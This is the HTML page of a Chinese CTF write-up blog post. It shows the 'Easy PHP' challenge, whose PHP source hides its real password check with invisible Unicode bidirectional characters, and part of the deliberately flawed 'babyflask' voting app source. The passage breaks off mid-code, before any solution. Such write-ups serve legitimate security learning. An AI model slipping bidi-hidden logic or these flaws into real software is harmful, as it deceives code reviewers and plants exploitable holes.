@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+  <meta name="description" content="L3H x XCTF个人能力认证wp前言​        前几天看到一个XCTF个人能力认证，预计规模为40人，然后随便报了下名，没想到走运被选上了。混了个第二。只会web还学不精。。确实有点吃亏  第一次录屏，EV录屏真不错，各项参数调最低，录屏8个半小时才600多M，而且看了下还挺清晰的，除了帧率有点低:)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="L3H x XCTF个人能力认证">
+<meta property="og:url" content="http://example.com/2021/11/14/XCTF%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81wp/index.html">
+<meta property="og:site_name" content="smcq&#39;s blog">
+<meta property="og:description" content="L3H x XCTF个人能力认证wp前言​        前几天看到一个XCTF个人能力认证，预计规模为40人，然后随便报了下名，没想到走运被选上了。混了个第二。只会web还学不精。。确实有点吃亏  第一次录屏，EV录屏真不错，各项参数调最低，录屏8个半小时才600多M，而且看了下还挺清晰的，除了帧率有点低:)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114181120916.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114183344829.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114171924703.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114172057665.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114172303141.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114173019587.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114173223039.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114173930287.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114174626249.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114174838916.png">
+<meta property="article:published_time" content="2021-11-14T11:01:46.000Z">
+<meta property="article:modified_time" content="2021-12-18T11:27:56.962Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114181120916.png">
+
+<link rel="canonical" href="http://example.com/2021/11/14/XCTF%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>L3H x XCTF个人能力认证 | smcq's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">smcq's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">不认,不输  脚踏实地</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/14/XCTF%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="smcq's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          L3H x XCTF个人能力认证
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-14 19:01:46" itemprop="dateCreated datePublished" datetime="2021-11-14T19:01:46+08:00">2021-11-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-18 19:27:56" itemprop="dateModified" datetime="2021-12-18T19:27:56+08:00">2021-12-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="L3H-x-XCTF个人能力认证wp"><a href="#L3H-x-XCTF个人能力认证wp" class="headerlink" title="L3H x XCTF个人能力认证wp"></a>L3H x XCTF个人能力认证wp</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        前几天看到一个XCTF个人能力认证，预计规模为40人，然后随便报了下名，没想到走运被选上了。混了个第二。只会web还学不精。。确实有点吃亏</p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114181120916.png" alt="image-20211114181120916"></p>
+<p>第一次录屏，EV录屏真不错，各项参数调最低，录屏8个半小时才600多M，而且看了下还挺清晰的，除了帧率有点低:)</p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114183344829.png" alt="image-20211114183344829"></p>
+<span id="more"></span>
+
+<h2 id="Easy-PHP"><a href="#Easy-PHP" class="headerlink" title="Easy PHP"></a>Easy PHP</h2><p>​        打开链接是这个页面，以为是签到，但传参后不对</p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114171924703.png" alt="image-20211114171924703"></p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114172057665.png" alt="image-20211114172057665"></p>
+<p>将代码复制到本地尝试复现，发现代码变成了这样:)</p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114172303141.png" alt="image-20211114172303141"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//这里显示不出来，但复制到本地用光标在字符间移动效果很明显</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">&amp;</span>‮⁦<span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span>⁩⁦<span class="token operator">&amp;</span> <span class="token string double-quoted-string">"‮⁦CTF⁩⁦l3hctf"</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>‮⁦<span class="token constant">L3H</span>⁩⁦password<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//Welcome to </span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"success"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>想起来前几天看到一个文章说在代码中插入不可见字符来污染源代码（大概是这个意思）</p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114173019587.png" alt="image-20211114173019587"></p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114173223039.png" alt="image-20211114173223039"></p>
+<p>虽然题目不难，但挺有意思的。相关信息可以看下这篇文章    <a target="_blank" rel="noopener" href="https://www.4hou.com/posts/oXy3">https://www.4hou.com/posts/oXy3</a></p>
+<h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a><strong>babyflask</strong></h2><p>给了源码</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
+
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span> render_template_string
+<span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemy
+
+<span class="token keyword">from</span> config <span class="token keyword">import</span> Config
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>Config<span class="token punctuation">)</span>
+db <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span>app<span class="token punctuation">)</span>
+
+<span class="token comment"># PERMANENT_SESSION_LIFETIME = timedelta(minutes=5)</span>
+<span class="token comment"># you have only 5 minutes</span>
+
+<span class="token keyword">class</span> <span class="token class-name">VoteLog</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    __tablename__ <span class="token operator">=</span> <span class="token string">'voteLog'</span>
+    username <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> unique<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    flag <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username
+        self<span class="token punctuation">.</span>flag <span class="token operator">=</span> flag
+
+<span class="token keyword">class</span> <span class="token class-name">VoteInfo</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    __tablename__ <span class="token operator">=</span> <span class="token string">'voteInfo'</span>
+    target <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> unique<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    num <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    name <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> name <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'vote'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    name <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> name <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>
+    session<span class="token punctuation">.</span>permanent <span class="token operator">=</span> <span class="token boolean">True</span>
+    <span class="token comment"># 重新登录便直接删掉前一个同用户名的登录信息</span>
+    log <span class="token operator">=</span> VoteLog<span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>VoteLog<span class="token punctuation">.</span>username <span class="token operator">==</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> log<span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>log<span class="token punctuation">)</span>
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>rollback<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">raise</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> name
+        session<span class="token punctuation">[</span><span class="token string">'vote'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span>
+        votelog <span class="token operator">=</span> VoteLog<span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>votelog<span class="token punctuation">)</span>
+        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>rollback<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">raise</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/vote'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">vote</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    name <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>
+    vote <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'vote'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> name <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> vote <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    vote_log <span class="token operator">=</span> VoteLog<span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>VoteLog<span class="token punctuation">.</span>username <span class="token operator">==</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    vote_flag_num <span class="token operator">=</span> vote_log<span class="token punctuation">.</span>flag
+    total_num <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'vote'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
+        target <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> target <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+            total_num<span class="token punctuation">[</span><span class="token string">'Emilia'</span><span class="token punctuation">]</span> <span class="token operator">=</span> VoteInfo<span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>VoteInfo<span class="token punctuation">.</span>target <span class="token operator">==</span> <span class="token string">'Emilia'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>num
+            total_num<span class="token punctuation">[</span><span class="token string">'Rem'</span><span class="token punctuation">]</span> <span class="token operator">=</span> VoteInfo<span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>VoteInfo<span class="token punctuation">.</span>target <span class="token operator">==</span> <span class="token string">'Rem'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>num
+            total_num<span class="token punctuation">[</span><span class="token string">'Felix'</span><span class="token punctuation">]</span> <span class="token operator">=</span> VoteInfo<span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>VoteInfo<span class="token punctuation">.</span>target <span class="token operator">==</span> <span class="token string">'Felix'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>num
+            total_num<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">=</span> VoteInfo<span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>VoteInfo<span class="token punctuation">.</span>target <span class="token operator">==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>num
+            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'vote.html'</span><span class="token punctuation">,</span> vote_num<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'vote'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vote_flag_num<span class="token operator">=</span>vote_flag_num<span class="token punctuation">,</span> total_num<span class="token operator">=</span>total_num<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> target <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'Emilia'</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">,</span> <span class="token string">'Rem'</span><span class="token punctuation">,</span> <span class="token string">'Felix'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">'target error'</span>
+        votes_info <span class="token operator">=</span> VoteInfo<span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>VoteInfo<span class="token punctuation">.</span>target <span class="token operator">==</span> target<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        votes_info<span class="token punctuation">.</span>num <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>rollback<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">raise</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> target <span class="token operator">==</span> <span class="token string">'flag'</span><span class="token punctuation">:</span>
+            vote_flag_num <span class="token operator">+=</span> <span class="token number">1</span>
+            vote_log<span class="token punctuation">.</span>flag <span class="token operator">=</span> vote_flag_num
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token keyword">if</span> vote_flag_num <span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">:</span>
+                    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+                db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>rollback<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token keyword">raise</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+        session<span class="token punctuation">[</span><span class="token string">'vote'</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span>
+    total_num<span class="token punctuation">[</span><span class="token string">'Emilia'</span><span class="token punctuation">]</span> <span class="token operator">=</span> VoteInfo<span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>VoteInfo<span class="token punctuation">.</span>target <span class="token operator">==</span> <span class="token string">'Emilia'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>num
+    total_num<span class="token punctuation">[</span><span class="token string">'Rem'</span><span class="token punctuation">]</span> <span class="token operator">=</span> VoteInfo<span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>VoteInfo<span class="token punctuation">.</span>target <span class="token operator">==</span> <span class="token string">'Rem'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>num
+    total_num<span class="token punctuation">[</span><span class="token string">'Felix'</span><span class="token punctuation">]</span> <span class="token operator">=</span> VoteInfo<span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>VoteInfo<span class="token punctuation">.</span>target <span class="token operator">==</span> <span class="token string">'Felix'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>num
+    total_num<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">=</span> VoteInfo<span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>VoteInfo<span class="token punctuation">.</span>target <span class="token operator">==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>num
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'vote.html'</span><span class="token punctuation">,</span> vote_num<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'vote'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vote_flag_num<span class="token operator">=</span>vote_flag_num<span class="token punctuation">,</span> total_num<span class="token operator">=</span>total_num<span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/success'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    name <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> name <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'?? fxck!'</span>
+    votelog <span class="token operator">=</span> VoteLog<span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>VoteLog<span class="token punctuation">.</span>username <span class="token operator">==</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
